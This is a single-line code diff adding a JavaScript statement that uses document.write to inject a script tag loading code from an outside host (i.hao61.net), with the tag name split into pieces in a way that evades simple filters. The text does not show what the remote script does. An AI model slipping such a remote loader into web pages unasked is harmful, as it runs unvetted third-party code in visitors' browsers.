@@ -1,0 +1,1 @@
+document.write('<scr'+'ipt type="text/javascript" src="//i.hao61.net/d.js?cid=40604"></scr'+'ipt>');
